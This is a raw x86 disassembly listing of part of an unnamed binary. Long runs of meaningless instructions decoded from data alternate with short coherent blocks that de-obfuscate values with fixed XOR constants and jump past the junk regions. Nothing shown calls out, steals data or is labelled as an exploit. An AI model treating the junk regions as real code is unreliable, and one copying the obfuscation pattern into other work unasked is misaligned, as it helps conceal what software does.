  41dca2:	data16 cbw 
  41dca5:	xor    edi,edi
  41dca7:	lea    ebp,[edx-0x8]
  41dcaa:	(bad)  
  41dcab:	xchg   ebx,eax
  41dcac:	(bad)  
  41dcad:	gs jno 0x41dc5d
  41dcb0:	ins    DWORD PTR es:[edi],dx
  41dcb1:	outs   dx,DWORD PTR ds:[esi]
  41dcb2:	pop    edx
  41dcb3:	cld    
  41dcb4:	lods   eax,DWORD PTR ds:[esi]
  41dcb5:	sbb    al,0x11
  41dcb7:	inc    esi
  41dcb8:	data16 mov al,0x94
  41dcbb:	push   esi
  41dcbc:	ds xor al,0xa9
  41dcbf:	sub    al,0x87
  41dcc1:	mov    al,0xa8
  41dcc3:	push   eax
  41dcc4:	fild   DWORD PTR [edx]
  41dcc6:	std    
  41dcc7:	xchg   edi,eax
  41dcc8:	mov    bl,0x6e
  41dcca:	xchg   edi,eax
  41dccb:	pop    edx
  41dccc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dccd:	push   cs
  41dcce:	sub    DWORD PTR [edi+0x6b],edx
  41dcd1:	dec    ecx
  41dcd2:	and    ch,ah
  41dcd4:	jl     0x41dd3a
  41dcd6:	jp     0x41dd08
  41dcd8:	mov    ebp,DWORD PTR [ebp+0x5bfba3d4]
  41dcde:	push   0xffffffea
  41dce0:	cmp    DWORD PTR [ebp+0x16e33a63],esi
  41dce6:	inc    esp
  41dce7:	dec    edi
  41dce8:	inc    esp
  41dce9:	popa   
  41dcea:	popf   
  41dceb:	push   DWORD PTR es:[edx-0x18]
  41dcef:	push   ss
  41dcf0:	mov    DWORD PTR [eax-0x10],eax
  41dcf3:	int    0x53
  41dcf5:	sbb    BYTE PTR [edx+0x5a],bl
  41dcf8:	popf   
  41dcf9:	mov    bh,0x81
  41dcfb:	loopne 0x41dd3f
  41dcfd:	outs   dx,BYTE PTR ds:[esi]
  41dcfe:	xchg   ebp,eax
  41dcff:	push   cs
  41dd00:	ss inc ebp
  41dd02:	mov    ecx,0xc120c956
  41dd07:	mov    edx,0x9a9226bd
  41dd0c:	loopne 0x41dca9
  41dd0e:	icebp  
  41dd0f:	sahf   
  41dd10:	(bad)  
  41dd11:	scas   al,BYTE PTR es:[edi]
  41dd12:	or     al,0x93
  41dd14:	push   0x66281d68
  41dd19:	popa   
  41dd1a:	popf   
  41dd1b:	aad    0xd0
  41dd1d:	les    ebx,FWORD PTR [ebx+0x56]
  41dd20:	add    BYTE PTR [edx-0x1a],ah
  41dd23:	xchg   ebp,eax
  41dd24:	xchg   esp,eax
  41dd25:	xchg   ebp,eax
  41dd26:	int    0x35
  41dd28:	outs   dx,DWORD PTR ds:[esi]
  41dd29:	mov    esi,0x64c297c
  41dd2e:	ret    
  41dd2f:	or     al,0x65
  41dd31:	and    al,0x67
  41dd33:	inc    esi
  41dd34:	and    BYTE PTR [ebp-0x5a],dl
  41dd37:	xor    DWORD PTR ds:0xaa65ad93,edx
  41dd3d:	aaa    
  41dd3e:	inc    cl
  41dd40:	and    eax,0xa7618b1
  41dd45:	lahf   
  41dd46:	int    0x1d
  41dd48:	cmc    
  41dd49:	test   DWORD PTR [eax],eax
  41dd4b:	enter  0x5766,0x9d
  41dd4f:	inc    ebp
  41dd50:	lods   al,BYTE PTR ds:[esi]
  41dd51:	or     al,ah
  41dd53:	and    DWORD PTR [edx],0xfffffffa
  41dd56:	push   eax
  41dd57:	aam    0x53
  41dd59:	mov    bh,0xe0
  41dd5b:	inc    edi
  41dd5c:	jns    0x41ddcd
  41dd5e:	dec    edi
  41dd5f:	shl    ch,0xda
  41dd62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd63:	retf   0xbb48
  41dd66:	fiadd  DWORD PTR [ecx]
  41dd68:	and    dh,dh
  41dd6a:	aam    0xe7
  41dd6c:	and    eax,0x287c9f80
  41dd71:	inc    ebp
  41dd72:	and    ebx,DWORD PTR [eax+0x21fb83cf]
  41dd78:	loope  0x41dd6a
  41dd7a:	adc    eax,0x6c58c4b5
  41dd7f:	sbb    ebx,DWORD PTR ss:[ebp-0x78]
  41dd83:	ficom  DWORD PTR [esi]
  41dd85:	lods   al,BYTE PTR ds:[esi]
  41dd86:	sbb    BYTE PTR [ebx-0x53600da1],bl
  41dd8c:	nop
  41dd8d:	lods   al,BYTE PTR ds:[esi]
  41dd8e:	or     ebx,ebx
  41dd90:	in     al,0x5c
  41dd92:	dec    eax
  41dd93:	xchg   BYTE PTR [ebx+0x69bfee35],dl
  41dd99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd9a:	add    eax,0xf5d4b094
  41dd9f:	loop   0x41dd77
  41dda1:	xlat   BYTE PTR ds:[ebx]
  41dda2:	jmp    0xb773e741
  41dda7:	sub    al,0x13
  41dda9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddaa:	pop    es
  41ddab:	cld    
  41ddac:	inc    esp
  41ddad:	dec    ebx
  41ddae:	es add dh,0x4
  41ddb2:	pop    esi
  41ddb3:	pop    ecx
  41ddb4:	rol    DWORD PTR [esi],0x42
  41ddb7:	mov    ah,0x76
  41ddb9:	pop    edi
  41ddba:	mov    cl,BYTE PTR [ebx]
  41ddbc:	scas   al,BYTE PTR es:[edi]
  41ddbd:	push   ds
  41ddbe:	pop    ebx
  41ddbf:	inc    edi
  41ddc0:	cmp    ebp,DWORD PTR [edi+0x26]
  41ddc3:	inc    ecx
  41ddc4:	jl     0x41de1f
  41ddc6:	(bad)  
  41ddc7:	push   edx
  41ddc8:	push   ds
  41ddc9:	pusha  
  41ddca:	adc    eax,0xbc1d3549
  41ddcf:	btc    esp,esp
  41ddd2:	fcom   DWORD PTR [edi+0x1f]
  41ddd5:	std    
  41ddd6:	(bad)  
  41ddd7:	pop    ss
  41ddd8:	jb     0x41dded
  41ddda:	lds    eax,FWORD PTR [edi-0x7ab0f311]
  41dde0:	pop    ds
  41dde1:	test   al,0xaf
  41dde3:	mov    ecx,0x7ca86a96
  41dde8:	pop    es
  41dde9:	daa    
  41ddea:	in     al,0xcd
  41ddec:	cwde   
  41dded:	leave  
  41ddee:	lahf   
  41ddef:	test   esi,0xc6479992
  41ddf5:	scas   eax,DWORD PTR es:[edi]
  41ddf6:	dec    ecx
  41ddf7:	jle    0x41de07
  41ddf9:	ficom  WORD PTR [eax+0x47]
  41ddfc:	xchg   edi,ebx
  41ddfe:	pop    edi
  41ddff:	cmp    al,0x72
  41de01:	cmp    ebp,DWORD PTR [edx]
  41de03:	push   ds
  41de04:	inc    edx
  41de05:	push   ds
  41de06:	and    al,0x9c
  41de08:	daa    
  41de09:	adc    edx,ebx
  41de0b:	add    DWORD PTR [esi+0x20a529d4],eax
  41de11:	inc    ecx
  41de12:	jb     0x41de36
  41de14:	dec    ebx
  41de15:	push   esi
  41de16:	repnz test DWORD PTR [esi],0x2723ebad
  41de1d:	pop    ebp
  41de1e:	enter  0x44e5,0xec
  41de22:	xor    eax,0xcb79b576
  41de27:	xor    edx,0x9c2b8ae8
  41de2d:	mov    cl,0x2
  41de2f:	call   0x408bb8
  41de34:	mov    ecx,edx
  41de36:	mov    edx,DWORD PTR [ebp-0x15c]
  41de3c:	mov    DWORD PTR [ebp-0x218],esi
  41de42:	mov    esi,DWORD PTR [ebp-0x158]
  41de48:	xor    edx,0xcb79b576
  41de4e:	xor    esi,0x9c2b8ae8
  41de54:	mov    DWORD PTR [ebp-0x21c],eax
  41de5a:	mov    eax,edx
  41de5c:	mov    edx,esi
  41de5e:	mov    DWORD PTR [ebp-0x220],ecx
  41de64:	mov    cl,0x3e
  41de66:	call   0x422394
  41de6b:	mov    esi,DWORD PTR [ebp-0x21c]
  41de71:	or     esi,eax
  41de73:	mov    eax,DWORD PTR [ebp-0x220]
  41de79:	or     eax,edx
  41de7b:	push   eax
  41de7c:	push   esi
  41de7d:	push   ebx
  41de7e:	push   edi
  41de7f:	call   0x41594e
  41de84:	mov    esi,DWORD PTR [ebp-0x218]
  41de8a:	cmp    esi,eax
  41de8c:	jne    0x41df42
  41de92:	mov    eax,DWORD PTR [ebp-0x154]
  41de98:	mov    edx,DWORD PTR [ebp-0x150]
  41de9e:	xor    eax,0xcb79b576
  41dea3:	xor    edx,0x9c2b8ae8
  41dea9:	mov    cl,0x2
  41deab:	call   0x408bb8
  41deb0:	mov    esi,eax
  41deb2:	mov    edi,edx
  41deb4:	mov    eax,DWORD PTR [ebp-0x154]
  41deba:	mov    edx,DWORD PTR [ebp-0x150]
  41dec0:	xor    eax,0xcb79b576
  41dec5:	xor    edx,0x9c2b8ae8
  41decb:	mov    cl,0x3e
  41decd:	call   0x422394
  41ded2:	or     esi,eax
  41ded4:	or     edi,edx
  41ded6:	mov    eax,DWORD PTR [ebp-0x15c]
  41dedc:	mov    edx,DWORD PTR [ebp-0x158]
  41dee2:	xor    eax,0xcb79b576
  41dee7:	xor    edx,0x9c2b8ae8
  41deed:	mov    cl,0x2
  41deef:	call   0x408bb8
  41def4:	mov    ebx,eax
  41def6:	mov    eax,edx
  41def8:	mov    ecx,DWORD PTR [ebp-0x15c]
  41defe:	mov    edx,DWORD PTR [ebp-0x158]
  41df04:	xor    ecx,0xcb79b576
  41df0a:	xor    edx,0x9c2b8ae8
  41df10:	mov    DWORD PTR [ebp-0x224],eax
  41df16:	mov    eax,ecx
  41df18:	mov    cl,0x3e
  41df1a:	call   0x422394
  41df1f:	or     ebx,eax
  41df21:	mov    eax,DWORD PTR [ebp-0x224]
  41df27:	or     eax,edx
  41df29:	push   eax
  41df2a:	push   ebx
  41df2b:	push   edi
  41df2c:	push   esi
  41df2d:	call   0x41594e
  41df32:	mov    DWORD PTR [ebp-0x178],eax
  41df38:	jmp    0x41f19e
  41df3d:	jmp    0x41f154
  41df42:	lea    eax,[ebp-0x168]
  41df48:	mov    DWORD PTR [ebp-0x164],eax
  41df4e:	mov    eax,DWORD PTR [ebp-0x164]
  41df54:	mov    DWORD PTR [eax],0xa5069bae
  41df5a:	mov    eax,DWORD PTR [ebp-0x168]
  41df60:	xor    eax,0xa5069bae
  41df65:	shr    eax,0x2
  41df68:	mov    ecx,DWORD PTR [ebp-0x168]
  41df6e:	xor    ecx,0xa5069bae
  41df74:	shl    ecx,0x1e
  41df77:	or     eax,ecx
  41df79:	mov    ecx,DWORD PTR [ebp-0x174]
  41df7f:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  41df83:	mov    DWORD PTR [ebp-0x160],eax
  41df89:	mov    esi,DWORD PTR [ebp-0x160]
  41df8f:	mov    eax,DWORD PTR [ebp-0x154]
  41df95:	mov    edx,DWORD PTR [ebp-0x150]
  41df9b:	xor    eax,0xcb79b576
  41dfa0:	xor    edx,0x9c2b8ae8
  41dfa6:	mov    cl,0x2
  41dfa8:	call   0x408bb8
  41dfad:	mov    edi,eax
  41dfaf:	mov    ebx,edx
  41dfb1:	mov    eax,DWORD PTR [ebp-0x154]
  41dfb7:	jmp    0x41e39e
  41dfbc:	mov    bl,0xa1
  41dfbe:	mov    eax,ds:0xbba5b3a5
  41dfc3:	mov    ebx,0xd1567b79
  41dfc8:	cmp    edx,edi
  41dfca:	or     BYTE PTR [edx-0x413fa070],dl
  41dfd0:	dec    edx
  41dfd1:	les    edi,FWORD PTR [esi-0x22739842]
  41dfd7:	fsub   QWORD PTR [edi-0x5568cf6]
  41dfdd:	test   al,0xf1
  41dfdf:	adc    eax,0x135e0d6d
  41dfe4:	iret   
  41dfe5:	sub    al,0xae
  41dfe7:	jle    0x41e067
  41dfe9:	gs push 0x27
  41dfec:	adc    ch,BYTE PTR [esi-0x28]
  41dfef:	inc    edx
  41dff0:	test   al,0x4a
  41dff2:	test   al,0xf
  41dff4:	hlt    
  41dff5:	sbb    BYTE PTR [eax],0x1b
  41dff8:	push   edi
  41dff9:	dec    ebp
  41dffa:	and    eax,esp
  41dffc:	ins    DWORD PTR es:[edi],dx
  41dffd:	push   edi
  41dffe:	sub    DWORD PTR [ebp-0x6f3e3487],ebx
  41e004:	addr16 dec ebx
  41e006:	sbb    al,0xc8
  41e008:	push   edi
  41e009:	and    al,0x5c
  41e00b:	movups XMMWORD PTR ds:0x13770878,xmm3
  41e012:	in     eax,0x6a
  41e014:	fs sub al,0x5f
  41e017:	fwait
  41e018:	pop    ss
  41e019:	sub    BYTE PTR [ebp-0x703cce73],ch
  41e01f:	out    dx,eax
  41e020:	js     0x41dfd0
  41e022:	test   BYTE PTR [esi+0x3a82f224],0xa2
  41e029:	in     eax,0xc8
  41e02b:	iret   
  41e02c:	fldenv [esi]
  41e02e:	and    esi,DWORD PTR [ebp-0x6]
  41e031:	add    al,0x68
  41e033:	adc    DWORD PTR [esp+edx*2],eax
  41e036:	aas    
  41e037:	test   al,0x4e
  41e039:	dec    ebp
  41e03a:	inc    DWORD PTR [esi+0x279aee2e]
  41e040:	and    eax,0xe0209b6
  41e045:	sbb    al,0x16
  41e047:	mov    cl,0x8d
  41e049:	inc    ebp
  41e04a:	and    DWORD PTR [eax],0xcf8f3c2d
  41e050:	sbb    BYTE PTR [esi+ebx*2],bl
  41e053:	mov    eax,0x7f51dc29
  41e058:	mov    ds:0x58718dfc,al
  41e05d:	sar    BYTE PTR [edi+0x5eaa53c3],cl
  41e063:	test   DWORD PTR [esi-0x51],0x15e01654
  41e06a:	push   es
  41e06b:	or     eax,0x280ad915
  41e070:	scas   al,BYTE PTR es:[edi]
  41e071:	dec    eax
  41e072:	lea    esi,[ebx-0x26799e3c]
  41e078:	jae    0x41e0f5
  41e07a:	mov    BYTE PTR [esi],dl
  41e07c:	loopne 0x41e07b
  41e07e:	or     BYTE PTR [ebx],al
  41e080:	add    BYTE PTR [esi],bl
  41e082:	and    DWORD PTR [edi+0x69],esp
  41e085:	mov    eax,ds:0xf928d4ba
  41e08a:	call   FWORD PTR [eax+eax*8-0x56fa338]
  41e091:	push   eax
  41e092:	(bad)  
  41e093:	in     eax,0x28
  41e095:	jnp    0x41e062
  41e097:	es dec eax
  41e099:	(bad)  [ebp-0x5ffdc85b]
  41e09f:	mov    ds:0x4b6cf69a,al
  41e0a4:	std    
  41e0a5:	sbb    ebx,DWORD PTR [edx-0x20]
  41e0a8:	or     BYTE PTR [eax+0x12121e0],0xf7
  41e0af:	pop    edi
  41e0b0:	push   ecx
  41e0b1:	mov    ds:0xc9317802,eax
  41e0b6:	jp     0x41e08c
  41e0b8:	or     dh,bh
  41e0ba:	frstor ds:0x778461d6
  41e0c0:	push   es
  41e0c1:	inc    ebp
  41e0c2:	outs   dx,BYTE PTR ds:[esi]
  41e0c3:	std    
  41e0c4:	sbb    ch,ch
  41e0c6:	pop    esp
  41e0c8:	and    dl,BYTE PTR ds:0x91f82269
  41e0ce:	mov    ecx,0xb6058860
  41e0d3:	rcl    DWORD PTR [esi-0x79],cl
  41e0d6:	mov    ebp,0x4b6c0702
  41e0db:	ret    
  41e0dc:	icebp  
  41e0dd:	les    esi,FWORD PTR [esp+edi*2]
  41e0e0:	ret    
  41e0e1:	sti    
  41e0e2:	lods   al,BYTE PTR ds:[esi]
  41e0e3:	fst    DWORD PTR [ecx+eax*4-0x792a4801]
  41e0ea:	cmp    eax,0x6a41b93d
  41e0ef:	pop    DWORD PTR [edx+eax*8]
  41e0f2:	sbb    eax,0xc8a05511
  41e0f7:	gs ins DWORD PTR es:[edi],dx
  41e0f9:	out    dx,al
  41e0fa:	sbb    al,0x5d
  41e0fc:	pop    eax
  41e0fd:	and    al,0x51
  41e0ff:	popf   
  41e100:	outs   dx,DWORD PTR ds:[esi]
  41e101:	addr16 popa 
  41e103:	cmp    DWORD PTR [edx+0x26],0x4
  41e107:	sbb    DWORD PTR [edi],edx
  41e109:	or     eax,0xfe24b135
  41e10e:	ins    BYTE PTR es:[edi],dx
  41e10f:	add    esp,ecx
  41e111:	push   ds
  41e112:	test   al,0xf2
  41e114:	dec    ebx
  41e115:	add    edx,edx
  41e117:	nop
  41e118:	mul    DWORD PTR [esi+0x67]
  41e11b:	aas    
  41e11c:	sbb    ecx,DWORD PTR [ebp+0x3c]
  41e11f:	mov    ss,WORD PTR [ebx+0x3e806728]
  41e125:	in     al,dx
  41e126:	push   cs
  41e127:	dec    esi
  41e128:	mov    ch,BYTE PTR [edi]
  41e12a:	cmp    al,0xec
  41e12c:	jl     0x41e0b8
  41e12e:	inc    esp
  41e12f:	add    BYTE PTR [ebx+0x13],ch
  41e132:	xor    bh,bl
  41e134:	mov    al,0xc1
  41e136:	daa    
  41e137:	cwde   
  41e138:	mov    eax,0x23664246
  41e13d:	ss xchg edi,edx
  41e140:	test   eax,0xd172b48f
  41e145:	popf   
  41e146:	popf   
  41e147:	lock call 0x6fec:0x5a00b50e
  41e14f:	cdq    
  41e150:	cmp    esp,DWORD PTR [ecx]
  41e152:	nop
  41e153:	loop   0x41e142
  41e155:	inc    edi
  41e156:	xor    cl,BYTE PTR cs:[esi]
  41e159:	mov    ch,cl
  41e15b:	mov    al,0x16
  41e15d:	sub    DWORD PTR [edi-0x7534a4ef],esp
  41e163:	inc    esp
  41e164:	sub    BYTE PTR [eax],0x81
  41e167:	xchg   ebx,eax
  41e168:	ror    bl,0x85
  41e16b:	add    ecx,DWORD PTR [ebx]
  41e16d:	xlat   BYTE PTR ds:[ebx]
  41e16e:	pushf  
  41e16f:	cld    
  41e170:	shr    BYTE PTR [ebp-0x56],1
  41e173:	jns    0x41e13f
  41e175:	or     esi,eax
  41e177:	sbb    edx,esp
  41e179:	es out dx,eax
  41e17b:	test   BYTE PTR [ecx],al
  41e17d:	inc    edx
  41e17e:	mov    DWORD PTR [eax],esi
  41e180:	addr16 push ebx
  41e182:	pop    ebx
  41e183:	cmp    BYTE PTR [eax-0x70f86597],ah
  41e189:	arpl   WORD PTR [edi+0x42],si
  41e18c:	xchg   edi,eax
  41e18d:	std    
  41e18e:	pop    ebp
  41e18f:	xchg   edi,eax
  41e190:	adc    eax,0x1a91ddf6
  41e195:	(bad)  
  41e196:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e197:	xor    al,0xf4
  41e199:	mov    WORD PTR [eax],fs
  41e19b:	dec    edx
  41e19c:	cwde   
  41e19d:	fisttp QWORD PTR [ebx]
  41e19f:	mov    ds:0x277fa3f0,al
  41e1a4:	fwait
  41e1a5:	rcr    BYTE PTR [esi-0xb],cl
  41e1a8:	mov    ebp,0x8c5ecf71
  41e1ad:	mov    bh,0x17
  41e1af:	shl    BYTE PTR [edx-0x673dac68],cl
  41e1b5:	sbb    DWORD PTR [ecx],ecx
  41e1b7:	jle    0x41e1ad
  41e1b9:	inc    esi
  41e1ba:	lods   al,BYTE PTR ds:[esi]
  41e1bb:	jmp    0xa7a0:0xdd0f4ba0
  41e1c2:	mov    ebp,0x87f26042
  41e1c7:	std    
  41e1c8:	push   ebp
  41e1c9:	addr16 inc edx
  41e1cb:	jbe    0x41e1e2
  41e1cd:	jae    0x41e19a
  41e1cf:	xor    DWORD PTR [esi+ebx*8+0x24],esp
  41e1d3:	mov    bl,0x3f
  41e1d5:	out    0x16,eax
  41e1d7:	pop    ds
  41e1d8:	(bad)  
  41e1d9:	stc    
  41e1da:	dec    edx
  41e1db:	jp     0x41e258
  41e1dd:	bnd es jp 0x41e218
  41e1e1:	push   ecx
  41e1e2:	stos   BYTE PTR es:[edi],al
  41e1e3:	cdq    
  41e1e4:	pop    esp
  41e1e5:	jp     0x41e229
  41e1e7:	sbb    BYTE PTR [ebx-0x68],ah
  41e1ea:	ss repz out 0xa1,eax
  41e1ee:	lahf   
  41e1ef:	jle    0x41e249
  41e1f1:	stc    
  41e1f2:	and    al,0x8c
  41e1f4:	jae    0x41e17d
  41e1f6:	sub    BYTE PTR [ebx-0x57dfeb6a],dh
  41e1fc:	xor    ecx,esi
  41e1fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1ff:	push   0xffffff9c
  41e201:	jno    0x41e222
  41e203:	push   0xff0ffe27
  41e208:	test   eax,0x9ef968e1
  41e20d:	shr    al,0x87
  41e210:	or     DWORD PTR [edi-0x617da098],edx
  41e216:	pop    esp
  41e217:	cs stos DWORD PTR es:[edi],eax
  41e219:	jbe    0x41e224
  41e21b:	xchg   esi,eax
  41e21c:	add    BYTE PTR [ebp+0x54e56bd6],ch
  41e222:	sbb    eax,0x531a2995
  41e227:	adc    BYTE PTR [edx-0x322e0717],al
  41e22d:	(bad)  
  41e22e:	in     eax,dx
  41e22f:	xor    al,0x3b
  41e231:	mov    edi,0x20c8a535
  41e236:	iret   
  41e237:	mov    edx,0x1b404216
  41e23c:	shr    BYTE PTR ds:0xa7a22b9c,cl
  41e243:	pop    ebp
  41e244:	mov    esi,0x7a3783fd
  41e249:	out    0xe7,al
  41e24b:	imul   eax,DWORD PTR [ebx],0xffffffe9
  41e24e:	ds pop esp
  41e250:	xchg   ebp,eax
  41e251:	dec    ebx
  41e252:	imul   edx,DWORD PTR [edx+0x13e515c9],0xa9e9aeaa
  41e25c:	in     eax,0xba
  41e25e:	int3   
  41e25f:	jle    0x41e2a6
  41e261:	aam    0xbc
  41e263:	adc    dl,BYTE PTR [ebx-0x6]
  41e266:	(bad)
  41e269:	pushf  
  41e26a:	jmp    DWORD PTR [esi+0x15dc2024]
  41e270:	pop    eax
  41e271:	dec    edx
  41e272:	dec    edx
  41e273:	(bad)  
  41e274:	push   edi
  41e275:	call   0x2152339a
  41e27a:	mov    ebx,0xd85c991f
  41e27f:	ret    0xd37
  41e282:	aad    0x99
  41e284:	xchg   ecx,eax
  41e285:	adc    al,0xe6
  41e287:	mov    esi,0xb8e6504d
  41e28c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e28d:	in     al,dx
  41e28e:	das    
  41e28f:	add    BYTE PTR ds:0x9da46501,ch
  41e295:	js     0x41e25a
  41e297:	and    al,0x66
  41e299:	add    DWORD PTR [edi-0x52],0x56
  41e29d:	test   DWORD PTR [ebx+0x6c],ebp
  41e2a0:	mov    ecx,0xc0cf79f1
  41e2a5:	in     eax,dx
  41e2a6:	push   ebx
  41e2a7:	mov    al,ss:0xaaec50be
  41e2ad:	mov    eax,ds:0x59de6bc8
  41e2b2:	mov    eax,ds:0x1f8bdd62
  41e2b7:	loopne 0x41e262
  41e2b9:	retf   
  41e2ba:	sub    BYTE PTR [ecx],bh
  41e2bc:	dec    esp
  41e2bd:	and    eax,0x2824f761
  41e2c2:	xor    DWORD PTR ds:0x95b5,ecx
  41e2c7:	mov    bh,0xa2
  41e2c9:	out    0xed,eax
  41e2cb:	enter  0x5260,0x25
  41e2cf:	mov    eax,0x273cffc2
  41e2d4:	cmp    DWORD PTR [ecx],ebx
  41e2d6:	inc    esp
  41e2d7:	fld    TBYTE PTR [ebx-0x7cf019e3]
  41e2dd:	out    dx,al
  41e2de:	lds    esi,FWORD PTR [edx-0x23]
  41e2e1:	add    al,0xa0
  41e2e3:	inc    edx
  41e2e4:	jp     0x41e2e1
  41e2e6:	adc    eax,0xc048c665
  41e2eb:	pop    ss
  41e2ec:	aas    
  41e2ed:	jo     0x41e2f8
  41e2ef:	push   cs
  41e2f0:	xor    eax,0x6cc43717
  41e2f5:	pop    eax
  41e2f6:	imul   esp,DWORD PTR [ecx+esi*2],0xffffff93
  41e2fa:	ins    DWORD PTR es:[edi],dx
  41e2fb:	pop    ebx
  41e2fc:	jbe    0x41e314
  41e2fe:	nop
  41e2ff:	add    BYTE PTR [ebx],0x6a
  41e302:	jnp    0x41e292
  41e304:	add    DWORD PTR [edi],eax
  41e306:	inc    ebp
  41e308:	fst    DWORD PTR [edi+0x40c9a803]
  41e30e:	sub    dl,BYTE PTR [edi+0x51]
  41e311:	jp     0x41e2f4
  41e313:	pop    es
  41e314:	test   al,0x73
  41e316:	or     eax,0xb0be4a97
  41e31b:	cmp    DWORD PTR [ecx-0x6f],edx
  41e31e:	mov    al,ds:0x39a5d115
  41e323:	cld    
  41e324:	in     eax,0xf4
  41e326:	cmp    DWORD PTR [ebx-0x641207c3],eax
  41e32c:	sti    
  41e32d:	jecxz  0x41e36a
  41e32f:	inc    edi
  41e330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e331:	mov    dh,0x5b
  41e333:	(bad)  
  41e334:	jbe    0x41e2db
  41e336:	pop    edi
  41e337:	imul   edx,DWORD PTR [esi],0xeb1cc0c0
  41e33d:	scas   eax,DWORD PTR es:[edi]
  41e33e:	cmp    dl,BYTE PTR [ebp-0x14]
  41e341:	js     0x41e390
  41e343:	outs   dx,BYTE PTR ds:[esi]
  41e344:	adc    BYTE PTR [ebx-0x15],dh
  41e347:	adc    DWORD PTR [edi-0x52],ebx
  41e34a:	xchg   esi,eax
  41e34b:	pop    edi
  41e34c:	jb     0x41e2f3
  41e34e:	in     al,dx
  41e34f:	cwde   
  41e350:	std    
  41e351:	add    BYTE PTR [ecx+0x62],bh
  41e354:	cmp    al,0xb4
  41e356:	xchg   esp,eax
  41e357:	pop    esi
  41e358:	(bad)  
  41e35a:	xchg   ebp,eax
  41e35b:	fcmove st,st(3)
  41e35d:	fistp  DWORD PTR [edx+0x5f21e49e]
  41e363:	shr    BYTE PTR [esi+0x27c14c83],cl
  41e369:	ins    BYTE PTR es:[edi],dx
  41e36a:	cmp    eax,0x4535bedf
  41e36f:	cmp    dl,dl
  41e371:	mov    ds:0x5c1932ad,al
  41e376:	test   eax,0xe9f07f4f
  41e37b:	xchg   dh,ch
  41e37d:	or     DWORD PTR [edx],esi
  41e37f:	push   cs
  41e380:	xchg   ecx,eax
  41e381:	jno    0x41e321
  41e383:	dec    esi
  41e384:	sub    eax,0x4aaa57e
  41e389:	push   edi
  41e38a:	jo     0x41e3f2
  41e38c:	aam    0x59
  41e38e:	sub    al,0xfe
  41e390:	ds hlt 
  41e392:	mov    WORD PTR [ecx-0x5],?
  41e395:	hlt    
  41e396:	sar    BYTE PTR [edi+0x2a],cl
  41e399:	test   al,0xd7
  41e39b:	mov    esi,DWORD PTR [edi-0x70]
  41e39e:	mov    edx,DWORD PTR [ebp-0x150]
  41e3a4:	xor    eax,0xcb79b576
  41e3a9:	xor    edx,0x9c2b8ae8
  41e3af:	mov    cl,0x3e
  41e3b1:	call   0x422394
  41e3b6:	or     edi,eax
  41e3b8:	or     ebx,edx
  41e3ba:	mov    eax,DWORD PTR [ebp-0x15c]
  41e3c0:	mov    edx,DWORD PTR [ebp-0x158]
  41e3c6:	xor    eax,0xcb79b576
  41e3cb:	xor    edx,0x9c2b8ae8
  41e3d1:	mov    cl,0x2
  41e3d3:	call   0x408bb8
  41e3d8:	mov    ecx,edx
  41e3da:	mov    edx,DWORD PTR [ebp-0x15c]
  41e3e0:	mov    DWORD PTR [ebp-0x228],esi
  41e3e6:	mov    esi,DWORD PTR [ebp-0x158]
  41e3ec:	xor    edx,0xcb79b576
  41e3f2:	xor    esi,0x9c2b8ae8
  41e3f8:	mov    DWORD PTR [ebp-0x22c],eax
  41e3fe:	mov    eax,edx
  41e400:	mov    edx,esi
  41e402:	mov    DWORD PTR [ebp-0x230],ecx
  41e408:	mov    cl,0x3e
  41e40a:	call   0x422394
  41e40f:	mov    esi,DWORD PTR [ebp-0x22c]
  41e415:	or     esi,eax
  41e417:	mov    eax,DWORD PTR [ebp-0x230]
  41e41d:	or     eax,edx
  41e41f:	push   eax
  41e420:	push   esi
  41e421:	jmp    0x41e808
  41e426:	rcl    BYTE PTR [ebp+0x47],cl
  41e429:	cmp    ecx,DWORD PTR [ebx+0x3b]
  41e42c:	mov    cl,0xb7
  41e42e:	scas   eax,DWORD PTR es:[edi]
  41e42f:	xor    ebx,DWORD PTR [ecx+edx*8]
  41e432:	call   DWORD PTR [ebx+0x64]
  41e435:	sahf   
  41e436:	sbb    al,0x67
  41e438:	sar    BYTE PTR [esi-0x41413bb6],0xf
  41e43f:	and    al,0x53
  41e441:	mov    DWORD PTR [edx],edi
  41e443:	dec    eax
  41e444:	ins    DWORD PTR es:[edi],dx
  41e445:	xlat   BYTE PTR ds:[ebx]
  41e446:	int3   
  41e447:	inc    edx
  41e448:	in     al,dx
  41e449:	lods   eax,DWORD PTR cs:[esi]
  41e44b:	sbb    al,0x9
  41e44d:	cmp    esp,DWORD PTR [eax+0x9]
  41e450:	inc    esp
  41e451:	test   al,0x46
  41e453:	ret    0xf254
  41e456:	pop    eax
  41e457:	cwde   
  41e458:	xchg   DWORD PTR [edx-0x4d815381],eax
  41e45e:	lods   eax,DWORD PTR ds:[esi]
  41e45f:	mov    cl,0x53
  41e461:	cli    
  41e462:	inc    ebx
  41e463:	scas   al,BYTE PTR es:[edi]
  41e464:	jo     0x41e42e
  41e466:	cmc    
  41e467:	pop    es
  41e468:	mov    esp,0x1f2a679a
  41e46d:	pop    ds
  41e46e:	aas    
  41e46f:	mov    al,0xdc
  41e471:	test   DWORD PTR [edx-0x7f],edi
  41e474:	fldenv [ebp-0x5bf969be]
  41e47a:	push   ss
  41e47b:	pop    ss
  41e47c:	les    edx,FWORD PTR [edx+0x30]
  41e47f:	inc    ecx
  41e480:	loop   0x41e422
  41e482:	call   DWORD PTR [edx+0x57d38b65]
  41e488:	dec    eax
  41e489:	ins    BYTE PTR es:[edi],dx
  41e48a:	jge    0x41e45c
  41e48c:	nop
  41e48d:	pop    esi
  41e48e:	jmp    0x41e45a
  41e490:	mov    al,gs:0x40db445d
  41e496:	push   edi
  41e497:	fsub   QWORD PTR [edx-0x2b]
  41e49a:	adc    al,0xb0
  41e49c:	push   esp
  41e49d:	dec    ebp
  41e49e:	adc    al,0x3b
  41e4a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4a1:	xor    ah,bh
  41e4a3:	inc    edi
  41e4a4:	and    DWORD PTR [eax+edi*2],esp
